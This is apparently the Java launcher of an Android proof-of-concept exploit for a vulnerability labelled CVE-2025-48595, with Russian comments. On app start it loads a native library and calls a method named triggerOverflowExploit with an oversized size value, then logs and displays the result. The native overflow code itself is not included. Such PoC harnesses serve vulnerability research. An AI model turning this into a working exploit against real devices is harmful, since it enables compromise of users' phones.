package com.example.android_poc;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String TAG = "CVE-2025-48595";

    // Загружаем библиотеку android_poc (совпадает с project name в CMake)
    static {
        System.loadLibrary("android_poc");
    }

    // Единственный нативный метод, который нам нужен сейчас
    public native String triggerOverflowExploit(int sizeHint);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i(TAG, "=== APP STARTED ===");

        // Вызываем C++ код с переполнением
        // Передаем 0xFFFFFFFF как подсказку размера (хотя внутри оно само посчитает)
        String result = triggerOverflowExploit(0xFFFFFFFF);

        Log.i(TAG, "Результат из C++: " + result);
        Toast.makeText(this, "Exploit Result: " + result, Toast.LENGTH_LONG).show();
    }
}